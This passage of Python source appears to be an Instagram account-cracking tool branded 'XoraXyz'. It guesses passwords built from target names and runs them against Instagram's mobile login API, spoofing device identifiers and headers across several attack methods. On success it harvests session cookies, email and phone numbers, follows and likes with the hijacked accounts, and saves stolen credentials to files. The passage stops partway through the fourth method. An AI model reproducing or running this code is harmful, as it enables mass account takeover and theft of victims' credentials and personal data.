                        XoraXyz.append(name_clean)
                    for pass_tambahan in password_tambahan:
                        if pass_tambahan.isdigit():
                            if len(name_clean) + len(pass_tambahan) >= 6:
                                XoraXyz.append(name_clean + pass_tambahan)
                        else:
                            if len(pass_tambahan) >= 6:
                                XoraXyz.append(pass_tambahan)
                if Menthod_Logined == "M1":
                    Poll.submit(Metode1, username, name, XoraXyz)
                if Menthod_Logined == "M2":
                    Poll.submit(Metode2, username, name, XoraXyz)  
                if Menthod_Logined == "M3":
                    Poll.submit(Metode3, username, name, XoraXyz)   
                if Menthod_Logined == "M4":
                    Poll.submit(Metode4, username, name, XoraXyz)       
                if Menthod_Logined == "M5":
                    Poll.submit(Metode5, username, name, XoraXyz)                
            except Exception as e:
                pass

def Metode1(username, name, pass_list):
    global Ok, Cp, A2f, Loop
    ses = requests.Session()
    with print_lock:
        print(f" {P}[{H}●{P}]{H} AttackingV1 {P}({H}{Loop}{P}/{K}{len(Aray_Bejir)}{P})-{P}({H}{Ok}{P}/{K}{Cp}{P})",end="\r")
        sys.stdout.flush()
    for password in pass_list:
        try:
            uag = UA_OLD()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            jazoest = str(random.randint(22000, 24000))
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            adid = str(uuid.uuid4())
            ses.headers.update({
                'Host': 'i.instagram.com',
                'User-Agent': uag,
                'accept-language': 'id-ID',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'ig-intended-user-id': '0',
                'priority': 'u=3',
                'x-bloks-is-layout-rtl': 'false',
                'x-bloks-version-id': '521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9',
                'x-fb-client-ip': 'True',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-fb-friendly-name': 'IgApi: accounts/login/',
                'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
                'x-fb-server-cluster': 'True',
                'x-ig-android-id': f'android-{android_id}',
                'x-ig-app-id': '567067343352427',
                'x-ig-app-locale': 'in_ID',
                'x-ig-bandwidth-speed-kbps': f"{random.gauss(18000, 5000):.1f}",
                'x-ig-bandwidth-totalbytes-b': str(int(random.gauss(4000000, 1000000))),
                'x-ig-bandwidth-totaltime-ms': str(int(random.gauss(3500, 1000))),
                'x-ig-client-endpoint': 'login_landing',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-device-id': device_id,
                'x-ig-device-locale': 'in_ID',
                'x-ig-family-device-id': family_device_id,
                'x-ig-mapped-locale': 'id_ID',
                'x-ig-nav-chain': f'LoginLandingFragment:login_landing:1:button:{base_ts}::',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-ig-www-claim': '0',
                'x-mid': machine_id,
                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-tigon-is-retry': 'False',
                'x-fb-http-engine': 'MNS',
                'x-fb-rmd': 'state=URL_ELIGIBLE'
            })
            inner_params = {"jazoest":jazoest,"country_codes":"[{\"country_code\":\"62\",\"source\":[\"default\",\"uig_via_phone_id\"]}]","phone_id":family_device_id,"enc_password":f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}","username":username,"adid":adid,"guid":device_id,"device_id":f"android-{android_id}","google_tokens":"[]","login_attempt_count":"0"}
            json_str = json.dumps(inner_params,separators=(',',':'))
            signed_body = f"SIGNATURE.{json_str}"
            data = {"signed_body":signed_body}
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=True)
            if "logged_in_user" in str(response.text.replace('\\', '')):
                Ok += 1
                header_str = str(response.headers)
                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1).strip()
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                bot_follow(cookies)
                auto_like(cookies)
                followers,following = info_user(username)
                email, phone = info_kontak(cookies)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                    print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                    print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                    f.write(f"Fullnames : {name}\n")
                    f.write(f"Usernames : {username}\n")
                    f.write(f"Passwords : {password}\n")
                    f.write(f"EmailUser : {email}\n")
                    f.write(f"PhoneNumb : {phone}\n")
                    f.write(f"Followers : {followers}\n")
                    f.write(f"Following : {following}\n")
                    f.write(f"Cookies : {cookies}\n")
                    f.write("-" * 40 + "\n")
                break
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            else:
               # print(f" RESPON: {H}{response.text}\n")
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            continue
    Loop += 1

def Metode2(username, name, pass_list):
    global Ok, Cp, A2f, Loop
    ses = requests.Session()
    with print_lock:
        print(f" {P}[{H}●{P}]{H} AttackingV2 {P}({H}{Loop}{P}/{K}{len(Aray_Bejir)}{P})-{P}({H}{Ok}{P}/{K}{Cp}{P})",end="\r")
        sys.stdout.flush()
    for password in pass_list:
        try:
            uag = UA_OLD()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            adid = str(uuid.uuid4())
            ses.headers.update({
                'Host': 'i.instagram.com',
                'User-Agent': uag,
                'Accept-Encoding': 'zstd, gzip, deflate',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': '521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9',
                'x-ig-www-claim': '0',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': family_device_id,
                'x-ig-android-id': f'android-{android_id}',
                'x-ig-timezone-offset': '25200',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'accept-language': 'id-ID, en-US',
                'x-mid': machine_id,
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True'
            })
            aac_init_ts = base_ts - 29
            aacjid = str(uuid.uuid4())
            aaccs = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=44))
            aac_str = json.dumps({"aac_init_timestamp": aac_init_ts,"aacjid": aacjid,"aaccs": aaccs}, separators=(',', ':'))
            client_input_params = {
                "aac": aac_str,
                "sim_phones": [],
                "aymh_accounts": [],
                "network_bssid": None,
                "secure_family_device_id": "",
                "has_granted_read_contacts_permissions": 0,
                "auth_secure_device_id": "",
                "has_whatsapp_installed": 1,
                "password": f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}",
                "sso_token_map_json_string": "",
                "block_store_machine_id": "",
                "cloud_trust_token": None,
                "event_flow": "login_manual",
                "password_contains_non_ascii": "false",
                "client_known_key_hash": "",
                "sso_accounts_auth_data": [],
                "encrypted_msisdn": "",
                "has_granted_read_phone_permissions": 0,
                "app_manager_id": "",
                "should_show_nested_nta_from_aymh": 0,
                "device_id": f"android-{android_id}",
                "zero_balance_state": "",
                "login_attempt_count": 0,
                "machine_id": machine_id,
                "accounts_list": [],
                "gms_incoming_call_retriever_eligibility": "client_not_supported",
                "family_device_id": family_device_id,
                "fb_ig_device_id": [],
                "device_emails": [],
                "try_num": 1,
                "lois_settings": {"lois_token": ""},
                "event_step": "home_page",
                "headers_infra_flow_id": "",
                "openid_tokens": {},
                "contact_point": username
            }
            waterfall_id = str(uuid.uuid4())
            server_params = {
                "should_trigger_override_login_2fa_action": 0,
                "is_from_logged_out": 0,
                "should_trigger_override_login_success_action": 0,
                "login_credential_type": "none",
                "server_login_source": "login",
                "waterfall_id": waterfall_id,
                "two_step_login_type": "one_step_login",
                "login_source": "Login",
                "is_platform_login": 0,
                "login_entry_point": "logged_out",
                "INTERNAL__latency_qpl_marker_id": 36707139,
                "is_from_aymh": 0,
                "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                "is_from_landing_page": 0,
                "left_nav_button_action": "NONE",
                "password_text_input_id": "az59w:100",
                "is_from_empty_password": 0,
                "is_from_msplit_fallback": 0,
                "ar_event_source": "login_home_page",
                "qe_device_id": device_id,
                "username_text_input_id": "az59w:99",
                "layered_homepage_experiment_group": None,
                "device_id": f"android-{android_id}",
                "login_surface": "login_home",
                "INTERNAL__latency_qpl_instance_id": int(random.random() * 1e12),
                "reg_flow_source": "login_home_native_integration_point",
                "is_caa_perf_enabled": 1,
                "credential_type": "password",
                "is_from_password_entry_page": 0,
                "caller": "gslr",
                "family_device_id": family_device_id,
                "is_from_assistive_id": 0,
                "access_flow_version": "pre_mt_behavior",
                "is_from_logged_in_switcher": 0
            }
            params_dict = {"client_input_params": client_input_params,"server_params": server_params}
            params_str = json.dumps(params_dict, separators=(',', ':'))
            bk_client_context = {"bloks_version": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9","styles_id": "instagram"}
            bk_client_context_str = json.dumps(bk_client_context, separators=(',', ':'))
            data = {"params": params_str,"bk_client_context": bk_client_context_str,"bloks_versioning_id": "521ea70a72c103e016c2ffa10d09834a109b7f5af5ec7a7c9a0e20e3b5bc71d9"}
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,allow_redirects=True)
            if "logged_in_user" in str(response.text.replace('\\', '')):
                #print(f" RESPON: {H}{response.text}\n")
                Ok += 1
                text_response = str(response.text.replace('\\', ''))
                ig_set_search = re.search('"IG-Set-Authorization": "(.*?)"', text_response)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1)
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part))
                            cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
                        except:
                            cookies = ('-')
                    else:
                        cookies = ('-')
                else:
                    ig_set_authorization = None
                    cookies = None
                bot_follow(cookies)
                auto_like(cookies)
                followers,following = info_user(username)
                email, phone = info_kontak(cookies)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                    print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                    print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                    f.write(f"Fullnames : {name}\n")
                    f.write(f"Usernames : {username}\n")
                    f.write(f"Passwords : {password}\n")
                    f.write(f"EmailUser : {email}\n")
                    f.write(f"PhoneNumb : {phone}\n")
                    f.write(f"Followers : {followers}\n")
                    f.write(f"Following : {following}\n")
                    f.write(f"Cookies : {cookies}\n")
                    f.write("-" * 40 + "\n")
                break
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            else:
               # print(f" RESPON: {H}{response.text}\n")
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            continue
    Loop += 1


def Metode3(username, name, pass_list):
    global Ok, Cp, Loop
    ses = requests.Session()
    with print_lock:
        print(f" {P}[{H}●{P}]{H} AttackingV3 {P}({H}{Loop}{P}/{K}{len(Aray_Bejir)}{P})-{P}({H}{Ok}{P}/{K}{Cp}{P})",end="\r")
        sys.stdout.flush()
    for password in pass_list:
        try:
            uag = UA_APP()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            jazoest = str(random.randint(22000, 24000))
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            adid = str(uuid.uuid4())
            zero_a_device_id = str(uuid.uuid4())
            fb_appnetsession_sid = ''.join(random.choices(string.hexdigits.lower(), k=32))
            fb_conn_uuid_client = ''.join(random.choices(string.hexdigits.lower(), k=32))
            fb_session_private = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            pigeon_session_id = f'UFS-{str(uuid.uuid4())}-0'
            fb_session_id = f'nid={ "".join(random.choices(string.ascii_letters + string.digits + "+/=", k=12)) };nc=1;fc=1;bc=0;'
            ses.headers.update({
                'Host': 'i.instagram.com',
                'User-Agent': uag,
                'accept-language': 'id-ID, en-US',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'ig-intended-user-id': '0',
                'priority': 'u=3',
                'x-bloks-is-layout-rtl': 'false',
                'x-bloks-prism-button-version': 'INDIGO_PRIMARY_BORDERED_SECONDARY',
                'x-bloks-prism-colors-enabled': 'true',
                'x-bloks-prism-extended-palette-gray': 'true',
                'x-bloks-prism-extended-palette-indigo': 'true',
                'x-bloks-prism-extended-palette-polish-enabled': 'false',
                'x-bloks-prism-extended-palette-red': 'true',
                'x-bloks-prism-extended-palette-rest-of-colors': 'true',
                'x-bloks-prism-font-enabled': 'true',
                'x-bloks-prism-indigo-link-version': '1',
                'x-bloks-version-id': '2a6e58f9d7d3bc66d326cab0c9a0c3fcba18cc5959ae6829d31a6817747cc017',
                'x-fb-client-ip': 'True',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-fb-friendly-name': 'IgApi: accounts/login/',
                'x-fb-network-properties': 'Mobile;Metered;Validated;',
                'x-fb-request-analytics-tags': '{"network_tags":{"product":"567067343352427","surface":"undefined","request_category":"api","purpose":"fetch","retry_attempt":"0"}}',
                'x-fb-server-cluster': 'True',
                'x-ig-android-id': f'android-{android_id}',
                'x-ig-app-id': '567067343352427',
                'x-ig-app-locale': 'in_ID',
                'x-ig-bandwidth-speed-kbps': f"{random.gauss(1800, 900):.3f}",
                'x-ig-bandwidth-totalbytes-b': str(int(random.gauss(650000, 350000))),
                'x-ig-bandwidth-totaltime-ms': str(int(random.gauss(650, 350))),
                'x-ig-client-endpoint': 'login_landing',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-device-id': device_id,
                'x-ig-device-locale': 'in_ID',
                'x-ig-family-device-id': family_device_id,
                'x-ig-is-foldable': 'false',
                'x-ig-mapped-locale': 'id_ID',
                'x-ig-nav-chain': f'LoginLandingFragment:login_landing:1:button:{base_ts}::',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-ig-www-claim': '0',
                'x-mid': machine_id,
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-pigeon-session-id': pigeon_session_id,
                'x-tigon-is-retry': 'False',
                'x-zero-a-device-id': zero_a_device_id,
                'x-zero-balance': 'INIT',
                'x-zero-d-device-id': device_id,
                'x-zero-eh': '2,IG040b54d0f5241a1c0b62f7ff2d4d2c76,' + ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=64)),
                'x-zero-f-device-id': family_device_id,
                'x-fb-appnetsession-nid': '88a849ea42cd66a76e73095c9d2e65d8,Cell',
                'x-fb-appnetsession-sid': fb_appnetsession_sid,
                'x-fb-conn-uuid-client': fb_conn_uuid_client,
                'x-fb-http-engine': 'Tigon/MNS/TCP',
                'x-fb-rmd': 'state=URL_ELIGIBLE',
                'x-fb-session-id': fb_session_id,
                'x-fb-session-private': fb_session_private,
                'zero-http-network-interface': 'cellular'
            })
            inner_params = {"jazoest":jazoest,"country_codes":"[{\"country_code\":\"62\",\"source\":[\"default\",\"uig_via_phone_id\"]}]","phone_id":family_device_id,"enc_password":f"#PWD_INSTAGRAM:0:{base_ts}:{urllib.parse.quote(password)}","username":username,"adid":adid,"guid":device_id,"device_id":f"android-{android_id}","google_tokens":"[]","login_attempt_count":"0"}
            json_str = json.dumps(inner_params,separators=(',',':'))
            signed_body = f"SIGNATURE.{json_str}"
            data = {"signed_body":signed_body}
            response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=False)
            resp_text = str(response.text).replace('\\', '')
            if "logged_in_user" in resp_text:
                Ok += 1
                header_str = str(response.headers)
                ig_set_search = re.search(r'IG-Set-Authorization["\']?\s*:\s*["\']?([^"\',]+)', header_str, re.IGNORECASE)
                if ig_set_search:
                    ig_set_authorization = ig_set_search.group(1).strip()
                    if 'Bearer IGT:2:' in ig_set_authorization:
                        b64_part = ig_set_authorization.split('Bearer IGT:2:')[1]
                        try:
                            decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(b64_part + '=='))
                            cookies = ";".join([f"{x}={y}" for x, y in decode_ig_set_authorization.items()])
                        except:
                            cookies = '-'
                    else:
                        cookies = '-'
                else:
                    cookies = '-'
                bot_follow(cookies)
                auto_like(cookies)
                followers,following = info_user(username)
                email, phone = info_kontak(cookies)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{H}[{P}⬤{H}]{P} ToolsBymee :{H} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{H}[{P}●{H}]{P} Savers :{H} {OKE}")
                    print(f"{H}[{P}•{H}]{P} Fullnames :{H} {name}")
                    print(f"{H}[{P}•{H}]{P} Usernames :{H} {username}")
                    print(f"{H}[{P}•{H}]{P} Passwords :{H} {password}")
                    print(f"{H}[{P}•{H}]{P} EmailUsers :{H} {email}")
                    print(f"{H}[{P}•{H}]{P} PhoneNumb :{H} {phone}")
                    print(f"{H}[{P}•{H}]{P} Followers :{H} {followers}")
                    print(f"{H}[{P}●{H}]{P} Followings :{H} {following}")
                    print(f"{H}[{P}⬤{H}]{P} Cookies :{H} {cookies}\n")
                with open(f"/sdcard/INSTAGRAM/RESULTS/SUCCESS/{OKE}", "a") as f:
                    f.write(f"Fullnames : {name}\n")
                    f.write(f"Usernames : {username}\n")
                    f.write(f"Passwords : {password}\n")
                    f.write(f"EmailUser : {email}\n")
                    f.write(f"PhoneNumb : {phone}\n")
                    f.write(f"Followers : {followers}\n")
                    f.write(f"Following : {following}\n")
                    f.write(f"Cookies : {cookies}\n")
                    f.write("-" * 40 + "\n")
                break
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in resp_text:
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif 'challenge_required' in resp_text or 'https://i.instagram.com/challenge/' in resp_text:
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            elif "checkpoint_challenge_required" in resp_text:
                Cp += 1
                followers,following = info_user(username)
                with print_lock:
                    print(" " * 100, end='\r')
                    print(f"{K}[{P}⬤{K}]{P} ToolsByme :{K} ミ★ 𝗫𝗼𝗿𝗮𝗫𝘆𝘇 ★彡")
                    print(f"{K}[{P}●{K}]{P} Savers :{K} {CPE}")
                    print(f"{K}[{P}•{K}]{P} Fullnames :{K} {name}")
                    print(f"{K}[{P}•{K}]{P} Usernames :{K} {username}")
                    print(f"{K}[{P}•{K}]{P} Passwords :{K} {password}")
                    print(f"{K}[{P}•{K}]{P} Followers :{K} {followers}")
                    print(f"{K}[{P}●{K}]{P} Following :{K} {following}")
                    print(f"{K}[{P}⬤{K}]{P} Useragent :{K} {uag}\n")
                open(f"/sdcard/INSTAGRAM/RESULTS/CHECKPOINT/{CPE}", "a").write(f'{username}|{password}\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            continue
    Loop += 1


def Metode4(username, name, pass_list):
    global Ok, Cp, A2f, Loop
    ses = requests.Session()
    with print_lock:
        print(f" {P}[{H}●{P}]{H} AttackV4 {P}({H}{Loop}{P}/{K}{len(Aray_Bejir)}{P})-{P}({H}{Ok}{P}/{K}{Cp}{P})",end="\r")
        sys.stdout.flush()
    for password in pass_list:
        try:
            uag = UA_APP()
            base_ts = int(time.time())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode() + password.encode())
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode() + '12345'.encode())
            android_id = _hash.hexdigest()[:16]
            machine_id = 'a' + ''.join(random.choices(string.ascii_letters + string.digits + '+-_', k=21))
            waterfall_id = str(uuid.uuid4())
            ses.headers.update({
                'Host': 'i.instagram.com',
                'x-bloks-version-id': 'd8c9ee5552bc8349b7da08ef6eb65f8cbd6dcd5ee7c64215670ac3a52b79d06b',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': family_device_id,
                'x-ig-android-id': f'android-{android_id}',
                'x-mid': machine_id,
                'user-agent': uag,
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'accept-language': 'id-ID',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-fb-connection-type': 'MOBILE.LTE',
                'connection': 'keep-alive',
                'accept-encoding': 'gzip, deflate',
            })
            enc_user = urllib.parse.quote(username)
            enc_pass = urllib.parse.quote(password)
